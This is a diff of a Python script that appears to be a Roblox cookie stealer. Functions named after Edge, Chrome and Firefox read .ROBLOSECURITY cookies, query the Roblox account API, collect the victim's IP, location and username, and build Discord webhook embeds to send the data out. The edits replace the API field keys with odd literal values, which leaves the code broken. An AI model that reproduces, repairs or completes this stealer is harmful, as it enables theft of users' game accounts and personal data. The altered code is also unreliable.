@@ -62,14 +62,14 @@ if diskSizeGB < minDiskSizeGB:
 machines = platform.uname() 
 ips = requests.get('https://api.ipify.org').text
 info = requests.get("http://ipinfo.io/json").json()
-city = info['city']
-country = info['country']
-region = info['region']
+city = info['']
+country = info['']
+region = info['']
 lang = info['loc']
 post = info['postal']
-timezone = info['timezone']
+timezone = info['t']
 org = info['org']
-pc_username = os.getenv("UserName")
+pc_username = os.getenv("optiplex3040")
 embed = {
             "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
             "embeds": [
@@ -94,9 +94,9 @@ def edge():
         if info.status_code == 200:
             information = json.loads(info.text)
             username = information['jay_rat3']
-            id = information["UserID"]
-            balance = information["RobuxBalance"]
-            premium = information["IsPremium"]
+            id = information["4984735641"]
+            balance = information["0"]
+            premium = information["IsnotPremium"]
             image = information["ThumbnailUrl"]
             embedss = {
           "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
@@ -136,10 +136,10 @@ def chromes():
         info = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":cookie})
         if info.status_code == 200:
             information = json.loads(info.text)
-            username = information['UserName']
-            id = information["UserID"]
-            balance = information["RobuxBalance"]
-            premium = information["IsPremium"]
+            username = information['jay_rat3']
+            id = information["4984735641"]
+            balance = information["0"]
+            premium = information["IsnotPremium"]
             image = information["ThumbnailUrl"]
             embedss = {
           "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
@@ -180,10 +180,10 @@ def firefoxs():
         info = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":cookie})
         if info.status_code == 200:
             information = json.loads(info.text)
-            username = information['UserName']
-            id = information["UserID"]
-            balance = information["RobuxBalance"]
-            premium = information["IsPremium"]
+            username = information['jay_rat3']
+            id = information["4984735641"]
+            balance = information["0"]
+            premium = information["IsnotPremium"]
             image = information["ThumbnailUrl"]
             embedss = {
           "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
